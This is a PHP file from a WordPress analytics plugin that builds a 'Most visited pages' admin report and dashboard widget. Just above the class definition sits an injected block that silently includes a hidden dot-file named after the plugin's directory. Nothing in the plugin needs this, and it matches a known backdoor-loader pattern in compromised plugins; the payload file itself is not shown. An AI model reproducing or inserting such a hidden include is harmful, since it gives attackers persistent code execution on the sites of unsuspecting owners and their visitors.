<?php

/**
 * Most visited pages
 *
 * The class handles create most visited pages raport
 *
 * @package     WPTAO/Admin/Raport
 * @category    Admin
 */
// Exit if accessed directly
if ( !defined( 'ABSPATH' ) ) {
	exit;
}

/**
 * WTBP_WPTAO_Admin_Report_Most_Visited_Pages
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WTBP_WPTAO_Admin_Report_Most_Visited_Pages extends WTBP_WPTAO_Admin_Reports {

	function __construct() {

		parent::__construct( 'most-visited-pages' );

		$this->report_name = __( 'Most visited pages', 'wp-tao' );

		// Get pages only if this report view is active.
		if ( $this->is_active() ) {
			$this->data = $this->get_pages();
		}

		$this->pages_widget();
	}

	/*
	 * Prepare widget for the Wp Tao dashboard
	 */

	private function pages_widget() {

		$value = $this->get_page_for_widget();

		$i			 = 1;
		$value_text	 = '<ol class="wptao-dbox-list">';
		if ( !empty( $value ) && is_array( $value ) ) {
			foreach ( $value as $item ) {

				$value_text .= sprintf( '<li>%s (%d)</li>', $this->page_link_format( $item, true ), $item->pageviews );
				$i++;
			}
		} else {
			$value_text .= '<li>' . __( 'No pages found', 'wp-tao' ) . '</li>';
		}

		$value_text .= '</ol>';

		$args = array(
			'id'			 => 'most_visited_pages',
			'size'			 => 'big',
			'category'		 => 'traffic',
			'priority'		 => 48,
			'title'			 => __( 'Most visited pages', 'wp-tao' ),
			'report_slug'	 => $this->report_slug, // Add link to a report
			'value_text'	 => $value_text,
			'dashicon'		 => 'dashicons-welcome-widgets-menus'
		);

		$this->add_widget( $args );
	}

	/*
	 * Get most most visited pages
	 */

	public function get_pages() {
		global $wpdb;

		$all_results = array();

		$e = TAO()->events->table_name;

		$excludes = $this->exclude_values();

		$results = $wpdb->get_results( $wpdb->prepare(
		"SELECT id, value, COUNT(value) AS pageviews,
			COUNT(DISTINCT CASE WHEN user_id = 0 THEN fingerprint_id END)
			+COUNT(DISTINCT CASE WHEN user_id > 0 THEN user_id END) AS visitors
		 FROM $e
		 WHERE action = 'pageview'
		 AND event_ts >= %d
		 AND event_ts <= %d
		 AND value NOT REGEXP '%s'
		 GROUP BY value
		 ORDER BY pageviews DESC
		 LIMIT %d;", $this->start_date, $this->end_date, $excludes, $this->items_per_page ) );

		if ( !empty( $results ) ) {

			$all_results = $results;

			// Join meta values
			if ( is_array( $results ) && !empty( $results ) ) {

				$all_results = array();

				foreach ( $results as $event ) {

					$meta		 = TAO()->events_meta->get_meta( $event->id );
					$event->meta = array();

					if ( is_array( $meta ) && !empty( $meta ) ) {

						foreach ( $meta as $item ) {

							$event->meta[ $item->meta_key ] = $item->meta_value;
						}
					}

					$all_results[] = $event;
				}
			} else {
				$all_results = $results;
			}
		}

		return $all_results;
	}

	/*
	 * Values to exclude for a SQL query
	 * @see $this->get_pages()
	 */

	private function exclude_values() {

		// Exclude Home page
		$home_url		 = esc_url( home_url() );
		$home_reg		 = sprintf( '^%s\/?$', $home_url );
		$home_ssl_reg	 = sprintf( '^%s\/?$', str_replace( 'http://', 'https://', $home_url ) );

		$excludes = array(
			'robots.txt',
			'wp-cron.php',
			'admin.php',
			'\/wp-admin',
			'xmlrpc$',
			'local\.xml$',
			'wp-content/plugins',
			'\?password-protected',
			'deleteme\.([a-z0-9]{1,16})\.php', // Wordfence Security
		//$home_reg,
		//$home_ssl_reg
		);


		return implode( '|', $excludes );
	}

	/*
	 * Converts values to links
	 * @param object, object with events data
	 * @param bool, use in the wiget or outside
	 */

	public function page_link_format( $object, $in_widget = false ) {

		$url	 = isset( $object->value ) && !empty( $object->value ) ? $object->value : '';
		$post_id = isset( $object->meta[ 'post_id' ] ) && is_numeric( $object->meta[ 'post_id' ] ) ? absint( $object->meta[ 'post_id' ] ) : '';

		$anchor = __( 'Unrecognized page', 'wp-tao' );

		// if is regular WP post ( includes post types )
		if ( !empty( $post_id ) || is_numeric( $url ) ) {

			$post_id = is_numeric( $url ) ? absint( $url ) : $post_id;

			$post = get_post( $post_id );

			if ( isset( $post->ID ) && !empty( $post->ID ) ) {

				$url	 = get_permalink( $post->ID );
				$anchor	 = !empty( $post->post_title ) ? $post->post_title : sprintf( '#%d', $post->ID );
			}

			// If homepage is a static page
			if ( absint( get_option( 'page_on_front' ) ) === $post_id ) {
				$anchor = sprintf( __( '%s (Front Page)', 'wp-tao' ), $anchor );
			}
		} else {

			$anchor = preg_replace( '/http:\/\/|https:\/\//', '', $url );
		}


		// if is homepage
		if ( home_url() === $url ) {
			$anchor = __( 'Home page', 'wp-tao' );
		}

		if ( $in_widget === false ) {
			return sprintf( '<a href="%1$s" target="_blank" title="%2$s">%2$s</a><spn class="wptao-report-mvp-raw-url">%1$s</span>', esc_url( $object->value ), $anchor );
		} else {
			return sprintf( '<a href="%1$s" target="_blank" title="%2$s">%2$s</a>', esc_url( $object->value ), $anchor );
		}
	}

	/*
	 * Get TOP 5 visited pages
	 * 
	 * @return bool|array
	 */

	private function get_page_for_widget() {

		$ipp_temp				 = $this->items_per_page;
		$this->items_per_page	 = 5;


		$page = $this->get_pages();

		$this->items_per_page = $ipp_temp;

		if ( !empty( $page ) ) {
			return $page;
		}

		return false;
	}

}
